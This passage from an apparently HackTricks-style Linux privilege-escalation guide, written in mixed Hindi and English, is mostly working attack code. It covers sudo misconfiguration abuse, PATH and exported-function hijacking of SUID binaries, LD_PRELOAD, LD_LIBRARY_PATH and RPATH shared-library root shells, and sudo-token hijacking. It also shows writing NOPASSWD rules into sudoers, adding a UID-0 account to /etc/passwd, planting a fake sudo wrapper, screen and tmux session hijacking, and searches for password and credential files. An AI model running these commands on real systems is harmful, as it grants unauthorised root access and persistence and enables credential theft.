ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
यदि **wildcard** का उपयोग किया जाता है (\*), तो यह और भी आसान है:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Countermeasures**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### बिना command path के Sudo command/SUID binary

यदि **sudo permission** किसी single command को **path निर्दिष्ट किए बिना** दी गई है: _hacker10 ALL= (root) less_ तो आप PATH variable को बदलकर इसका exploit कर सकते हैं
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
इस technique का उपयोग तब भी किया जा सकता है जब कोई **suid** binary **किसी अन्य command को उसका path निर्दिष्ट किए बिना execute करती है (हमेशा एक अजीब SUID binary के content को** _**strings**_ **से check करें)**।

[Execute करने के लिए Payload examples।](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### SUID binary के साथ command path

यदि **suid** binary **किसी अन्य command को उसका path निर्दिष्ट करके execute करती है**, तो आप उस command के नाम पर **एक function export** करने का प्रयास कर सकते हैं, जिसे suid file call कर रही है।

उदाहरण के लिए, यदि कोई suid binary _**/usr/sbin/service apache2 start**_ को call करती है, तो आपको function बनाने और उसे export करने का प्रयास करना होगा:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
फिर, जब आप suid binary को call करेंगे, यह function execute होगा

### SUID wrapper द्वारा execute की गई Writable script

एक सामान्य custom-app misconfiguration एक root-owned SUID binary wrapper है, जो एक script execute करता है, जबकि वह script स्वयं low-priv users के लिए writable होती है।

Typical pattern:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
यदि `/usr/local/bin/backup.sh` writable है, तो आप payload commands append कर सकते हैं और फिर SUID wrapper execute कर सकते हैं:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
त्वरित जाँचें:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
यह attack path विशेष रूप से `/usr/local/bin` में उपलब्ध कराए गए "maintenance"/"backup" wrappers में सामान्य है।

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** environment variable का उपयोग एक या अधिक shared libraries (.so files) निर्दिष्ट करने के लिए किया जाता है, जिन्हें loader अन्य सभी libraries से पहले load करता है, जिसमें standard C library (`libc.so`) भी शामिल है। इस process को library preload करना कहा जाता है।

हालांकि, system security बनाए रखने और इस feature के exploit होने से रोकने के लिए, विशेष रूप से **suid/sgid** executables के साथ, system कुछ conditions लागू करता है:

- Loader उन executables के लिए **LD_PRELOAD** को अनदेखा करता है जिनमें real user ID (_ruid_) effective user ID (_euid_) से match नहीं करती।
- suid/sgid वाले executables के लिए केवल standard paths में मौजूद वे libraries preload की जाती हैं जो स्वयं भी suid/sgid हों।

Privilege escalation तब हो सकती है जब आपके पास `sudo` के साथ commands execute करने की ability हो और `sudo -l` का output **env_keep+=LD_PRELOAD** statement शामिल करे। यह configuration **LD_PRELOAD** environment variable को persist करने और commands को `sudo` के साथ run किए जाने पर भी recognize करने की अनुमति देती है, जिससे elevated privileges के साथ arbitrary code execute हो सकता है।
```
Defaults        env_keep += LD_PRELOAD
```
**/tmp/pe.c** के रूप में सेव करें
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
फिर इसे **compile** करके:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
अंततः, **escalate privileges** चलाकर
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> यदि attacker **LD_LIBRARY_PATH** env variable को नियंत्रित करता है, तो इसी तरह के privesc का दुरुपयोग किया जा सकता है, क्योंकि वह उस path को नियंत्रित करता है जहाँ libraries को search किया जाएगा।
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

जब किसी ऐसे binary का सामना हो जिस पर **SUID** permissions हों और जो असामान्य लगे, तो यह verify करना अच्छा practice है कि वह **.so** files को सही तरीके से load कर रहा है या नहीं। इसे निम्नलिखित command चलाकर check किया जा सकता है:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
उदाहरण के लिए, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ जैसी error का सामना होना exploitation की संभावित संभावना का संकेत देता है।

इसे exploit करने के लिए, कोई व्यक्ति _"/path/to/.config/libcalc.c"_ नाम की C file बनाकर उसमें निम्नलिखित code डाल सकता है:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
यह code, compile और execute किए जाने के बाद, file permissions में बदलाव करके और elevated privileges के साथ shell execute करके privileges बढ़ाने का लक्ष्य रखता है।

ऊपर दी गई C file को इस command के साथ shared object (.so) file में compile करें:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
अंततः, प्रभावित SUID binary को चलाने पर exploit सक्रिय होना चाहिए, जिससे system compromise की संभावना हो सकती है।

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
अब जब हमें एक SUID binary मिल गई है जो ऐसे folder से library load कर रही है जहाँ हम लिख सकते हैं, तो आवश्यक name वाली library उस folder में बनाते हैं:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
यदि आपको इस तरह की कोई error मिले
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
इसका मतलब है कि आपके द्वारा बनाई गई library में `a_function_name` नाम का एक function होना चाहिए।

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) Unix binaries की एक curated list है, जिनका उपयोग attacker local security restrictions को bypass करने के लिए कर सकता है। [**GTFOArgs**](https://gtfoargs.github.io/) भी ऐसी ही list है, लेकिन उन मामलों के लिए जहां आप किसी command में **केवल arguments inject** कर सकते हैं।

यह project Unix binaries के legitimate functions को collect करता है, जिनका दुरुपयोग restricted shells से बाहर निकलने, elevated privileges को escalate या बनाए रखने, files transfer करने, bind और reverse shells spawn करने तथा अन्य post-exploitation tasks को सुविधाजनक बनाने के लिए किया जा सकता है।

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

यदि आप `sudo -l` access कर सकते हैं, तो यह जांचने के लिए [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) tool का उपयोग कर सकते हैं कि क्या यह किसी sudo rule का exploit खोजता है।

### Sudo Tokens का पुनः उपयोग

ऐसे मामलों में जहां आपके पास **sudo access** है लेकिन password नहीं है, आप **sudo command execution की प्रतीक्षा करके और फिर session token को hijack करके privileges escalate** कर सकते हैं।

Privileges escalate करने की requirements:

- आपके पास पहले से user "_sampleuser_" के रूप में एक shell है
- "_sampleuser_" ने **पिछले 15 मिनट में `sudo` का उपयोग** करके कुछ execute किया हो (डिफ़ॉल्ट रूप से sudo token की अवधि 15 मिनट होती है, जो हमें कोई password दिए बिना `sudo` उपयोग करने की अनुमति देती है)
- `cat /proc/sys/kernel/yama/ptrace_scope` का output 0 हो
- `gdb` accessible हो (आप इसे upload कर सकें)

(आप `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` से `ptrace_scope` को अस्थायी रूप से enable कर सकते हैं या `/etc/sysctl.d/10-ptrace.conf` को स्थायी रूप से modify करके `kernel.yama.ptrace_scope = 0` set कर सकते हैं।)

यदि ये सभी requirements पूरी होती हैं, तो **आप इसका उपयोग करके privileges escalate कर सकते हैं:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **पहला exploit** (`exploit.sh`) _/tmp_ में `activate_sudo_token` binary बनाएगा। आप इसका उपयोग **अपने session में sudo token activate करने** के लिए कर सकते हैं (आपको automatically root shell नहीं मिलेगा, `sudo su` चलाएं):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **दूसरा exploit** (`exploit_v2.sh`) _/tmp_ में **root के स्वामित्व वाला और setuid युक्त** sh shell बनाएगा।
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **तीसरा exploit** (`exploit_v3.sh`) एक **sudoers file बनाएगा**, जो **sudo tokens को अनिश्चितकालीन बनाएगा और सभी users को sudo उपयोग करने की अनुमति देगा**.
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

यदि आपके पास इस folder में या folder के अंदर बनाई गई किसी भी file पर **write permissions** हैं, तो आप binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) का उपयोग करके **किसी user और PID के लिए sudo token बना** सकते हैं।\
उदाहरण के लिए, यदि आप file _/var/run/sudo/ts/sampleuser_ को overwrite कर सकते हैं और आपके पास उस user के रूप में PID 1234 वाला shell है, तो आप password जाने बिना इस प्रकार **sudo privileges प्राप्त** कर सकते हैं:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

`/etc/sudoers` फ़ाइल और `/etc/sudoers.d` के अंदर की फ़ाइलें यह configure करती हैं कि कौन `sudo` का उपयोग कर सकता है और कैसे। ये फ़ाइलें **default रूप से केवल user root और group root द्वारा पढ़ी जा सकती हैं**।\
**यदि** आप इस फ़ाइल को **read** कर सकते हैं, तो आप **कुछ interesting information प्राप्त कर सकते हैं**, और यदि आप किसी भी फ़ाइल को **write** कर सकते हैं, तो आप **privileges escalate** कर सकेंगे।
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
यदि आप लिख सकते हैं, तो आप इस अनुमति का दुरुपयोग कर सकते हैं।
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
इन permissions का दुरुपयोग करने का एक और तरीका:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` binary के कुछ alternatives हैं, जैसे OpenBSD के लिए `doas`; इसकी configuration को `/etc/doas.conf` पर check करना याद रखें।
```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```
यदि `doas` किसी editor या interpreter की अनुमति देता है, तो GTFOBins-style escapes की जाँच करें:
```bash
doas vim
:!/bin/sh
```
### Sudo Hijacking

यदि आपको पता है कि कोई **user आमतौर पर किसी machine से connect करता है और privileges escalate करने के लिए `sudo` का उपयोग करता है**, और आपको उस user context के भीतर shell मिल गया है, तो आप **एक नया sudo executable बना सकते हैं** जो आपके code को root के रूप में execute करेगा और फिर user की command चलाएगा। इसके बाद, user context के **$PATH को modify करें** (उदाहरण के लिए `.bash_profile` में नया path जोड़कर), ताकि user जब sudo execute करे, तो आपका sudo executable execute हो।

ध्यान दें कि यदि user किसी अलग shell का उपयोग करता है (bash नहीं), तो नया path जोड़ने के लिए आपको अन्य files को modify करना होगा। उदाहरण के लिए[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` को modify करता है। आप [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) में एक और example पा सकते हैं।

या कुछ इस तरह run करके:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

फ़ाइल `/etc/ld.so.conf` यह बताती है कि **लोड की गई configuration files कहाँ से आती हैं**। आमतौर पर, इस फ़ाइल में निम्नलिखित path होता है: `include /etc/ld.so.conf.d/*.conf`

इसका अर्थ है कि `/etc/ld.so.conf.d/*.conf` की configuration files पढ़ी जाएँगी। ये configuration files **अन्य folders की ओर संकेत करती हैं**, जहाँ **libraries** को **search** किया जाएगा। उदाहरण के लिए, `/etc/ld.so.conf.d/libc.conf` का content `/usr/local/lib` है। **इसका अर्थ है कि system `/usr/local/lib` के अंदर libraries को search करेगा**।

यदि किसी कारण से **किसी user के पास write permissions** इनमें से किसी path पर हों: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` के अंदर की कोई file या `/etc/ld.so.conf.d/*.conf` के अंदर configuration file में दिए गए किसी folder पर, तो वह privileges escalate करने में सक्षम हो सकता है।\
**इस misconfiguration का exploit कैसे करें**, यह जानने के लिए निम्नलिखित page देखें:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
`lib` को `/var/tmp/flag15/` में कॉपी करने पर, `RPATH` variable में निर्दिष्ट स्थान पर प्रोग्राम द्वारा इसका उपयोग किया जाएगा।
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
फिर `/var/tmp` में `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` के साथ एक malicious library बनाएं.
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities किसी **process को उपलब्ध root privileges का एक subset** प्रदान करती हैं। यह प्रभावी रूप से root **privileges को छोटी और अलग-अलग units में विभाजित** करता है। इसके बाद इनमें से प्रत्येक unit को processes को स्वतंत्र रूप से प्रदान किया जा सकता है। इस तरह privileges का पूरा set कम हो जाता है और exploitation के risks घटते हैं।\
**Capabilities और उनका abuse करने के तरीके के बारे में अधिक जानने** के लिए निम्नलिखित पेज पढ़ें:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Directory permissions

किसी directory में **"execute" bit** का अर्थ है कि संबंधित user उस folder में "**cd**" कर सकता है।\
**"read" bit** का अर्थ है कि user **files** को **list** कर सकता है, और **"write" bit** का अर्थ है कि user नई **files** को **delete** और **create** कर सकता है।

## ACLs

Access Control Lists (ACLs), discretionary permissions की secondary layer को दर्शाती हैं, जो **traditional ugo/rwx permissions को override करने में सक्षम** होती हैं। ये permissions उन specific users को rights की अनुमति देकर या अस्वीकार करके file या directory access पर बेहतर control प्रदान करती हैं, जो owners नहीं हैं या group का हिस्सा नहीं हैं। यह **granularity अधिक precise access management सुनिश्चित करती है**। अधिक details [**यहाँ**](https://linuxconfig.org/how-to-manage-acls-on-linux) मिल सकती हैं।

किसी file पर user "kali" को read और write permissions **देें**:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**प्राप्त करें** सिस्टम से विशिष्ट ACLs वाली फ़ाइलें:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### sudoers drop-ins में छिपा ACL backdoor

एक सामान्य misconfiguration `/etc/sudoers.d/` में मौजूद ऐसी `root-owned` फ़ाइल है जिसका mode `440` होता है, लेकिन फिर भी ACL के माध्यम से low-priv user को write access प्राप्त होता है।
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
यदि आपको `user:alice:rw-` जैसा कुछ दिखाई देता है, तो उपयोगकर्ता restrictive mode bits के बावजूद sudo rule जोड़ सकता है:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
यह high-impact ACL persistence/privesc path है क्योंकि केवल `ls -l` reviews में इसे आसानी से miss किया जा सकता है।

## खुले shell sessions

**पुराने versions** में आप किसी अलग user (**root**) के कुछ **shell** session को **hijack** कर सकते हैं।\
**नवीनतम versions** में आप केवल अपने **user** के screen sessions से **connect** कर पाएँगे। हालाँकि, आपको **session के अंदर interesting information** मिल सकती है।

### screen sessions hijacking

**screen sessions की सूची बनाएँ**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![screen sessions hijacking - Socket locations (some systems expose one as symlink of the other): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**किसी session से जुड़ें**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

यह **पुराने tmux versions** के साथ एक समस्या थी। मैं किसी गैर-विशेषाधिकार प्राप्त user के रूप में root द्वारा बनाए गए tmux (v2.1) session को hijack नहीं कर सका।

**tmux sessions की सूची बनाएं**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![Socket locations (some systems expose one as symlink of the other) - tmux sessions hijacking: tmux -S /tmp/dev sess ls इस socket का उपयोग करके सूची दिखाएँ, आप इस socket में tmux session शुरू कर सकते हैं...](<../../images/image (837).png>)

**किसी session से attach करें**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
उदाहरण के लिए **Valentine box from HTB** देखें।

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

सितंबर 2006 और 13 मई 2008 के बीच Debian आधारित systems (Ubuntu, Kubuntu, आदि) पर generate की गई सभी SSL और SSH keys इस bug से प्रभावित हो सकती हैं।\
यह bug उन OS में नई ssh key बनाते समय होता है, क्योंकि **केवल 32,768 variations संभव थे**। इसका अर्थ है कि सभी possibilities की गणना की जा सकती है और **ssh public key होने पर आप संबंधित private key खोज सकते हैं**। आप calculated possibilities यहां पा सकते हैं: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** यह निर्दिष्ट करता है कि password authentication की अनुमति है या नहीं। Default `no` है।
- **PubkeyAuthentication:** यह निर्दिष्ट करता है कि public key authentication की अनुमति है या नहीं। Default `yes` है।
- **PermitEmptyPasswords**: जब password authentication की अनुमति हो, तो यह निर्दिष्ट करता है कि server empty password strings वाले accounts में login की अनुमति देता है या नहीं। Default `no` है।

### Login control files

ये files यह प्रभावित करती हैं कि कौन login कर सकता है और कैसे:

- **`/etc/nologin`**: मौजूद होने पर non-root logins को block करता है और अपना message प्रदर्शित करता है।
- **`/etc/securetty`**: यह सीमित करता है कि root कहां login कर सकता है (TTY allowlist)।
- **`/etc/motd`**: post-login banner (environment या maintenance details leak कर सकता है)।

### PermitRootLogin

यह निर्दिष्ट करता है कि root ssh का उपयोग करके login कर सकता है या नहीं, जिसका default `no` है। संभावित values:

- `yes`: root password और private key का उपयोग करके login कर सकता है
- `without-password` या `prohibit-password`: root केवल private key के साथ login कर सकता है
- `forced-commands-only`: Root केवल private key का उपयोग करके login कर सकता है और commands options निर्दिष्ट होने चाहिए
- `no` : no

### AuthorizedKeysFile

यह उन files को निर्दिष्ट करता है जिनमें user authentication के लिए उपयोग की जा सकने वाली public keys होती हैं। इसमें `%h` जैसे tokens हो सकते हैं, जिन्हें home directory से replace किया जाएगा। **आप absolute paths निर्दिष्ट कर सकते हैं** (जो `/` से शुरू होते हैं) या **user के home से relative paths**। उदाहरण के लिए:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
यह configuration दर्शाएगी कि यदि आप **user** "**testusername**" की **private** key से login करने का प्रयास करते हैं, तो ssh आपकी key की public key की तुलना `/home/testusername/.ssh/authorized_keys` और `/home/testusername/access` में मौजूद keys से करेगा।

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding आपको अपने server पर **keys छोड़ने के बजाय अपनी local SSH keys का उपयोग करने** देता है (बिना passphrases के!)। इसलिए, आप ssh के माध्यम से **एक host पर jump** कर सकेंगे और वहां से अपने **initial host** में मौजूद **key का उपयोग करके** किसी अन्य host पर **jump** कर सकेंगे।

आपको `$HOME/.ssh.config` में यह option इस प्रकार set करना होगा:
```
Host example.com
ForwardAgent yes
```
ध्यान दें कि यदि `Host` हर बार `*` है जब user किसी दूसरी machine पर जाता है, तो वह host keys तक access कर सकेगा (जो एक security issue है)।

फ़ाइल `/etc/ssh_config` इन **options** को **override** कर सकती है और इस configuration को allow या deny कर सकती है।\
फ़ाइल `/etc/sshd_config` keyword `AllowAgentForwarding` के साथ ssh-agent forwarding को **allow** या **deny** कर सकती है (default allow है)।

यदि आपको पता चलता है कि किसी environment में Forward Agent configured है, तो निम्न page पढ़ें, क्योंकि **आप इसका abuse करके privileges escalate करने में सक्षम हो सकते हैं**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Interesting Files

### Profile files

फ़ाइल `/etc/profile` और `/etc/profile.d/` के अंदर की files **ऐसी scripts हैं जो user द्वारा नया shell चलाने पर execute होती हैं**। इसलिए, यदि आप इनमें से किसी को **write या modify कर सकते हैं, तो आप privileges escalate कर सकते हैं**।
```bash
ls -l /etc/profile /etc/profile.d/
```
यदि कोई अजीब profile script मिले, तो आपको उसमें **sensitive details** की जाँच करनी चाहिए।

### Passwd/Shadow Files

OS के आधार पर `/etc/passwd` और `/etc/shadow` files में अलग नाम का उपयोग हो सकता है या उनका कोई backup मौजूद हो सकता है। इसलिए यह recommended है कि **इन सभी को खोजें** और **जाँचें कि क्या आप उन्हें पढ़ सकते हैं**, ताकि यह देखा जा सके कि **files के अंदर hashes हैं या नहीं**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
कुछ अवसरों पर आपको `/etc/passwd` (या समकक्ष) फ़ाइल के अंदर **password hashes** मिल सकते हैं।
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### लिखने योग्य /etc/passwd

पहले, निम्नलिखित में से किसी एक command से password generate करें।
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
फिर उपयोगकर्ता `hacker` जोड़ें और जनरेट किया गया पासवर्ड सेट करें।
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
उदाहरण: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

अब आप `hacker:hacker` के साथ `su` command का उपयोग कर सकते हैं।

वैकल्पिक रूप से, आप बिना password वाला dummy user जोड़ने के लिए निम्नलिखित lines का उपयोग कर सकते हैं।\
WARNING: इससे machine की वर्तमान security कमज़ोर हो सकती है।
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
नोट: BSD प्लेटफ़ॉर्म में `/etc/passwd` `/etc/pwd.db` और `/etc/master.passwd` पर स्थित होती है, और `/etc/shadow` का नाम बदलकर `/etc/spwd.db` कर दिया जाता है।

आपको जाँचना चाहिए कि क्या आप **कुछ संवेदनशील फ़ाइलों में लिख** सकते हैं। उदाहरण के लिए, क्या आप किसी **service configuration file** में लिख सकते हैं?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
उदाहरण के लिए, यदि मशीन **tomcat** सर्वर चला रही है और आप **/etc/systemd/ के अंदर मौजूद Tomcat service configuration file को modify कर सकते हैं,** तो आप निम्नलिखित पंक्तियों को modify कर सकते हैं:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
आपका backdoor अगली बार tomcat शुरू होने पर execute किया जाएगा।

### Folders की जाँच करें

निम्नलिखित folders में backups या रोचक जानकारी हो सकती है: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (संभवतः आप आखिरी वाले को पढ़ नहीं पाएँगे, लेकिन प्रयास करें)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### असामान्य स्थान/स्वामित्व वाली फ़ाइलें
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### पिछले कुछ मिनटों में संशोधित की गई फ़ाइलें
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB फ़ाइलें
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml फ़ाइलें
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### छिपी हुई फ़ाइलें
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH में Script/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web files**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **बैकअप**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Passwords वाली ज्ञात files

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) का code पढ़ें, यह **कई संभावित files को खोजता है जिनमें passwords हो सकते हैं**।\
